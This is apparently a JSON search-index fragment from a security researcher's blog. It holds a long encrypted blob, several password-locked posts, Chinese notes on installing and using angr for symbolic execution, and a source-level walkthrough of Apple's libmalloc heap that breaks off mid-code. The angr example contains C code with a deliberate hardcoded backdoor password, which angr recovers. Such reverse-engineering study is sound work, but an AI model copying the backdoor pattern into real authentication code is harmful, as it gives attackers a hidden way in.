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","tags":[{"name":"Android","slug":"Android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"},{"name":"debug","slug":"debug","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"}]},{"title":"Android AutoJS 脚本加密分析","date":"2019-04-25T07:12:09.000Z","path":"2019/04/25/autojs加密分析/autojs加密分析/","text":"show me the code Incorrect Password! No content to display! ","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"AutoJS","slug":"AutoJS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"}]},{"title":"符号执行解决代码混淆实践","date":"2019-04-15T06:42:12.000Z","path":"2019/04/15/antiOLLVM/antiOLLVM/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"angr","slug":"angr","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"},{"name":"ollvm","slug":"ollvm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"}]},{"title":"再谈arm指令编码","date":"2019-04-15T06:42:12.000Z","path":"2019/04/15/arm-instruction-encode/arm-instruction-encode/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"arm","slug":"arm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"}]},{"title":"angr learning note","date":"2019-04-03T06:29:25.000Z","path":"2019/04/03/angr-learning-note/angr-learning-note/","text":"angr学习笔记安装macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是pip install angr却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。 It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team. 既然官方都这么说了，没理由不安装python3版本的，pip3 install angr一把梭吧。然后又报错了 SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39; 明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题 Building unicorn from source requires Python 2, so will fail inside a virtualenv where python gets you Python 3. If you encounter errors with pip install angr, you may need to first install unicorn separately, pointing it to your Python 2: UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn # Python 2 is probably /usr/bin/python on your macOS system 意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。 $ cd bindings/python $ sudo make install3 $ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot; 1.0.0 通过这样，我的python3环境中也安装了unicorn。这时候再执行pip3 install angr这下一路畅通，安装完成。 迫不及待尝试导入angr试下，结果又报错了 angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib Reason: image not found) 这个错误很明显，就是angr_native.dylib中加载libpyvex.dylib的时候找不到该动态库。看了下angr_native.dylib的macho格式里load command中加载libpyvex.dylib部分，发现是在其当前目录下去查找libpyvex.dylib和libunicorn.1.dylib。关于这个问题其实官方文档中也提及到这个问题 PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;` UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;` ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;` install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylib install_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib 就是通过重新指定加载libunicorn.dylib和libpyvex.dylib 的位置。执行完脚本以后，angr算是安装完成了。 使用直接上例子来学习，官方的fauxware例子 C源码如下 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdlib.h&gt; char *sneaky = &quot;SOSNEAKY&quot;; int authenticate(char *username, char *password) { char stored_pw[9]; stored_pw[8] = 0; int pwfile; // evil back d00r if (strcmp(password, sneaky) == 0) return 1; pwfile = open(username, O_RDONLY); read(pwfile, stored_pw, 8); if (strcmp(password, stored_pw) == 0) return 1; return 0; } int accepted() { printf(&quot;Welcome to the admin console, trusted user!\\n&quot;); } int rejected() { printf(&quot;Go away!&quot;); exit(1); } int main(int argc, char **argv) { char username[9]; char password[9]; int authed; username[8] = 0; password[8] = 0; printf(&quot;Username: \\n&quot;); read(0, username, 8); read(0, &amp;authed, 1); printf(&quot;Password: \\n&quot;); read(0, password, 8); read(0, &amp;authed, 1); authed = authenticate(username, password); if (authed) accepted(); else rejected(); } 简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入 import angr filename = &#39;the/filepath/of/fauxware&#39; proj = angr.Project(filename, auto_load_libs=False) st = proj.factory.entry_state() while True: succ = st.step() if len(succ.successors) == 2: break st = succ.successors[0] st1, st2 = succ.successors print(st1, st2) print(st1.posix.dumps(0)) print(st2.posix.dumps(0)) 下面解释下这个python代码 proj = angr.Project(filename, auto_load_libs=False)加载一个二进制文件，然后得到一个程序开始处的状态st = proj.factory.entry_state()下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。 &lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt; b&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00&#39; b&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80@\\x80\\x80\\x00\\x00&#39; 可以看出st1也就是成功授权的输入为SOSNEAKY。 基本概念factory该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。 blocks project.factory.block()给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。 block = proj.factory.block(proj.entry) block.pp() # 打印block反汇编代码 block.instructions # 指令个数 block.instruction_addrs # 指令地址list states angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。 state = proj.factory.entry_state() &lt;SimState @ 0x401670&gt; 既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。 # 访问寄存器和内存 &gt;&gt;&gt; state.regs.rip # get the current instruction pointer &lt;BV64 0x401670&gt; &gt;&gt;&gt; state.regs.rax &lt;BV64 0x1c&gt; &gt;&gt;&gt; state.mem[proj.entry].int.resolved # interpret the memory at the entry point as a C int &lt;BV32 0x8949ed31&gt; # 修改寄存器和内存 &gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64) &gt;&gt;&gt; state.regs.rsi &lt;BV64 0x3&gt; &gt;&gt;&gt; state.mem[0x1000].long = 4 &gt;&gt;&gt; state.mem[0x1000].long.resolved &lt;BV64 0x4&gt; 这些数据都是bitvectors，所以需要一个转换 &gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32) # create a 32-bit-wide bitvector with value 0x1234 &lt;BV32 0x1234&gt; # BVV stands for bitvector value &gt;&gt;&gt; state.solver.eval(bv) # convert to python int 0x1234 mem有几点需要注意： .type有char, short, int, long, size_t, uint8_t, uint16_t等 .resolved得到bitvector；.concrete得到int值 simulation managers state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。 &gt;&gt;&gt; simgr = proj.factory.simulation_manager(state) &lt;SimulationManager with 1 active&gt; &gt;&gt;&gt; simgr.active [&lt;SimState @ 0x401670&gt;] 这里我们用state去初始化了simulation managers得到了一组state。.active返回当前state。 &gt;&gt;&gt; simgr.step() &gt;&gt;&gt; simgr.active [&lt;SimState @ 0x1020300&gt;] &gt;&gt;&gt; simgr.active[0].regs.rip # new and exciting! &lt;BV64 0x1020300&gt; &gt;&gt;&gt; state.regs.rip # still the same! &lt;BV64 0x401670&gt; 通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。 待更新… 参考 https://docs.angr.io/core-concepts/ https://www.secpulse.com/archives/83197.html","tags":[{"name":"angr","slug":"angr","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"}]},{"title":"applepie writeup分析","date":"2019-04-02T06:02:40.000Z","path":"2019/04/02/applepie/applepie/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[]},{"title":"源码解读macOS/iOS Heap","date":"2019-04-01T07:30:31.000Z","path":"2019/04/01/深入理解macos-heap/深入理解macos-heap/","text":"源码解读macOS/iOS Heap 关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。 从malloc说起malloc是我们经常使用的函数，这里也是libmalloc.dylib暴露出来的接口，另外苹果开源了libmalloc代码。所以接下来我们就从源码的角度深入下去。 void * malloc(size_t size) { void *retval; retval = malloc_zone_malloc(default_zone, size); if (retval == NULL) { errno = ENOMEM; } return retval; } 这里实际调用了malloc_zone_malloc函数，传入了default_zone全局变量 static virtual_default_zone_t virtual_default_zone __attribute__((section(&quot;__DATA,__v_zone&quot;))) __attribute__((aligned(PAGE_MAX_SIZE))) = { NULL, NULL, default_zone_size, default_zone_malloc, default_zone_calloc, default_zone_valloc, default_zone_free, default_zone_realloc, default_zone_destroy, DEFAULT_MALLOC_ZONE_STRING, default_zone_batch_malloc, default_zone_batch_free, &amp;default_zone_introspect, 10, default_zone_memalign, default_zone_free_definite_size, default_zone_pressure_relief, default_zone_malloc_claimed_address, }; static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone; 这里初始化了一个默认的zone，正如名字一样virtual_default_zone其实是一个虚假的zone，接下来是调用malloc_zone_malloc void * malloc_zone_malloc(malloc_zone_t *zone, size_t size) { MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0); void *ptr; if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) { internal_check(); } if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) { return NULL; } ptr = zone-&gt;malloc(zone, size); // if lite zone is passed in then we still call the lite methods if (malloc_logger) { malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0); } MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0); return ptr; } 这里调用的ptr = zone-&gt;malloc(zone, size);就是default_zone_malloc函数 static void * default_zone_malloc(malloc_zone_t *zone, size_t size) { zone = runtime_default_zone(); return zone-&gt;malloc(zone, size); } 这里的runtime_default_zone()很重要，其实这里才是去真正的初始化zone runtime_default_zone // inline ----inline_malloc_default_zone //inline --------_malloc_initialize_once //inline ------------_malloc_initialize() 下面看_malloc_initialize函数，去掉了一些不相干代码 static void _malloc_initialize(void *context __unused) { MALLOC_LOCK(); unsigned n; malloc_zone_t *zone = NULL; ... zone = create_scalable_zone(0, malloc_debug_flags); malloc_zone_register_while_locked(zone); malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING); initial_default_zone = zone; if (n != 0) { // make the default first, for efficiency unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *); malloc_zone_t *hold = malloc_zones[0]; if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) { malloc_set_zone_name(hold, NULL); } mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE); malloc_zones[0] = malloc_zones[n]; malloc_zones[n] = hold; mprotect(malloc_zones, protect_size, PROT_READ); } ... } 这里主要看create_scalable_zone函数，所以默认的zone实际上就是scalable zone malloc_zone_t * create_scalable_zone(size_t initial_size, unsigned debug_flags) { return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags); } szone_t * create_scalable_szone(size_t initial_size, unsigned debug_flags) { szone_t *szone; /* get memory for the zone. */ szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC); if (!szone) { return NULL; } ... // Query the number of configured processors. // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives // the same behavior as the original scalable malloc. MP gets per-CPU magazines // that scale (way) better. unsigned int max_mags = mag_max_magazines(); uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1; rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags); rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags); #if CONFIG_LARGE_CACHE // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%] szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10); /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */ int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;); if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) { szone-&gt;large_legacy_reset_mprotect = TRUE; } else { szone-&gt;large_legacy_reset_mprotect = FALSE; } #endif // Initialize the security token. szone-&gt;cookie = (uintptr_t)malloc_entropy[0]; szone-&gt;basic_zone.version = 10; szone-&gt;basic_zone.size = (void *)szone_size; szone-&gt;basic_zone.malloc = (void *)szone_malloc; szone-&gt;basic_zone.calloc = (void *)szone_calloc; szone-&gt;basic_zone.valloc = (void *)szone_valloc; szone-&gt;basic_zone.free = (void *)szone_free; szone-&gt;basic_zone.realloc = (void *)szone_realloc; szone-&gt;basic_zone.destroy = (void *)szone_destroy; szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc; szone-&gt;basic_zone.batch_free = (void *)szone_batch_free; szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect; szone-&gt;basic_zone.memalign = (void *)szone_memalign; szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size; szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief; szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address; /* Set to zero once and for all as required by CFAllocator. */ szone-&gt;basic_zone.reserved1 = 0; /* Set to zero once and for all as required by CFAllocator. */ szone-&gt;basic_zone.reserved2 = 0; /* Prevent overwriting the function pointers in basic_zone. */ mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ); szone-&gt;debug_flags = debug_flags; _malloc_lock_init(&amp;szone-&gt;large_szone_lock); szone-&gt;cpu_id_key = -1UL; // Unused. CHECK(szone, __PRETTY_FUNCTION__); return szone; } 这个函数分配并且初始化了szone，设置了szone_malloc、szone_free等函数 所以后面在调用malloc和free的时候实际上调用的是szone_malloc、szone_free。szone_malloc的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的malloc_zone_*进行实际的内存分配工作。 下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致 * frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482 frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18 frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77 frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103 frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24 frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109 frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37 frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396 frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197 frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68 .... scalable zoneszone包含两个racks，分别是tiny和small rack rack 32位机器 64位机器 tiny &lt;= 496B &lt;= 1008B small &lt;= 128KB &lt;=128KB 大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。 有几个处理器，rack就有几个magazine 每个magazine有多个regions，tiny(1MB)、small(8MB) 每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region) 具体可以从后面结构体中看出来其包含关系。 malloc-&gt;szone_malloc-&gt;szone_malloc_should_clearMALLOC_NOINLINE void * szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested) { void *ptr; msize_t msize; if (size &lt;= SMALL_THRESHOLD) { // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit) // think tiny msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1); if (!msize) { msize = 1; } ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested); } else if (size &lt;= szone-&gt;large_threshold) { // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS) // think small msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1); if (!msize) { msize = 1; } ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested); } else { // large: all other allocations size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift; if (num_kernel_pages == 0) { /* Overflowed */ ptr = 0; } else { ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested); } } return ptr; } 上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例 tiny_malloc_should_clearvoid * tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested) { void *ptr; mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines; magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested); #if DEBUG_MALLOC if (DEPOT_MAGAZINE_INDEX == mag_index) { malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\\n&quot;); return (NULL); } if (!msize) { malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\\n&quot;); return (NULL); } #endif SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); #if CONFIG_TINY_CACHE ptr = tiny_mag_ptr-&gt;mag_last_free; if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) { // we have a winner tiny_mag_ptr-&gt;mag_last_free = NULL; tiny_mag_ptr-&gt;mag_last_free_msize = 0; tiny_mag_ptr-&gt;mag_last_free_rgn = NULL; SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } #if DEBUG_MALLOC if (LOG(szone, ptr)) { malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\\n&quot;, ptr, msize); } #endif return ptr; } #endif /* CONFIG_TINY_CACHE */ while (1) { ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize); if (ptr) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } return ptr; } if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) { ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize); if (ptr) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } return ptr; } } // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc(). // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section. // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation, // and retry-ing threads succeed in the code just above. if (!tiny_mag_ptr-&gt;alloc_underway) { void *fresh_region; // time to create a new region (do this outside the magazine lock) tiny_mag_ptr-&gt;alloc_underway = TRUE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); // DTrace USDT Probe MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE); if (!fresh_region) { // out of memory! tiny_mag_ptr-&gt;alloc_underway = FALSE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); return NULL; } ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region); // we don&#39;t clear because this freshly allocated space is pristine tiny_mag_ptr-&gt;alloc_underway = FALSE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); return ptr; } else { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); yield(); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); } } /* NOTREACHED */ } 这里的if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。 free-&gt;malloc_zone_free-&gt;szone_freevoid szone_free(szone_t *szone, void *ptr) { region_t tiny_region; region_t small_region; #if DEBUG_MALLOC if (LOG(szone, ptr)) { malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\\n&quot;, ptr); } #endif if (!ptr) { return; } /* * Try to free to a tiny region. */ if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\\n&quot;, ptr); return; } if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) { if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\\n&quot;, ptr); return; } free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0); return; } /* * Try to free to a small region. */ if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\\n&quot;, ptr); return; } if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) { if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\\n&quot;, ptr); return; } free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0); return; } /* check that it&#39;s a legal large allocation */ if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\\n&quot;, ptr); return; } free_large(szone, ptr); } 同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例 void free_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size) { msize_t msize; boolean_t is_free; mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region); magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size); // ptr is known to be in tiny_region if (known_size) { msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1); } else { msize = get_tiny_meta_header(ptr, &amp;is_free); if (is_free) { free_tiny_botch(rack, ptr); return; } } #if DEBUG_MALLOC if (!msize) { malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\\n&quot;, ptr); 